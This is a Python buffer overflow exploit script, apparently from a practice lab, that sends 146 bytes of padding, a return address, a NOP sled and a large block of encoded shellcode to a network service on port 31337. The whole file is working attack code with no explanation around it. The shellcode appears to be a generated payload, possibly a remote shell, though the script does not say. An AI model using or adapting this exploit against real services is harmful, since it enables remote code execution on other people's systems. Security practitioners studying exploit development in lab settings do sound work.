#!/usr/bin/env python3
#set a offset from offset.py
import socket, time


ip = "10.10.97.208"
port = 31337

prefix = ""
offset = 146	
overflow = "A" * offset



retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xd9\xc3\xbd\x8a\x9a\x7f\xdc\xd9\x74\x24\xf4\x5b\x29\xc9"
"\xb1\x52\x31\x6b\x17\x03\x6b\x17\x83\x49\x9e\x9d\x29\xb1"
"\x77\xe3\xd2\x49\x88\x84\x5b\xac\xb9\x84\x38\xa5\xea\x34"
"\x4a\xeb\x06\xbe\x1e\x1f\x9c\xb2\xb6\x10\x15\x78\xe1\x1f"
"\xa6\xd1\xd1\x3e\x24\x28\x06\xe0\x15\xe3\x5b\xe1\x52\x1e"
"\x91\xb3\x0b\x54\x04\x23\x3f\x20\x95\xc8\x73\xa4\x9d\x2d"
"\xc3\xc7\x8c\xe0\x5f\x9e\x0e\x03\xb3\xaa\x06\x1b\xd0\x97"
"\xd1\x90\x22\x63\xe0\x70\x7b\x8c\x4f\xbd\xb3\x7f\x91\xfa"
"\x74\x60\xe4\xf2\x86\x1d\xff\xc1\xf5\xf9\x8a\xd1\x5e\x89"
"\x2d\x3d\x5e\x5e\xab\xb6\x6c\x2b\xbf\x90\x70\xaa\x6c\xab"
"\x8d\x27\x93\x7b\x04\x73\xb0\x5f\x4c\x27\xd9\xc6\x28\x86"
"\xe6\x18\x93\x77\x43\x53\x3e\x63\xfe\x3e\x57\x40\x33\xc0"
"\xa7\xce\x44\xb3\x95\x51\xff\x5b\x96\x1a\xd9\x9c\xd9\x30"
"\x9d\x32\x24\xbb\xde\x1b\xe3\xef\x8e\x33\xc2\x8f\x44\xc3"
"\xeb\x45\xca\x93\x43\x36\xab\x43\x24\xe6\x43\x89\xab\xd9"
"\x74\xb2\x61\x72\x1e\x49\xe2\x77\xdd\x20\xcb\xef\xe3\xc2"
"\x3a\xac\x6a\x24\x56\x5c\x3b\xff\xcf\xc5\x66\x8b\x6e\x09"
"\xbd\xf6\xb1\x81\x32\x07\x7f\x62\x3e\x1b\xe8\x82\x75\x41"
"\xbf\x9d\xa3\xed\x23\x0f\x28\xed\x2a\x2c\xe7\xba\x7b\x82"
"\xfe\x2e\x96\xbd\xa8\x4c\x6b\x5b\x92\xd4\xb0\x98\x1d\xd5"
"\x35\xa4\x39\xc5\x83\x25\x06\xb1\x5b\x70\xd0\x6f\x1a\x2a"
"\x92\xd9\xf4\x81\x7c\x8d\x81\xe9\xbe\xcb\x8d\x27\x49\x33"
"\x3f\x9e\x0c\x4c\xf0\x76\x99\x35\xec\xe6\x66\xec\xb4\x07"
"\x85\x24\xc1\xaf\x10\xad\x68\xb2\xa2\x18\xae\xcb\x20\xa8"
"\x4f\x28\x38\xd9\x4a\x74\xfe\x32\x27\xe5\x6b\x34\x94\x06"
"\xbe")
postfix = ""	



buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")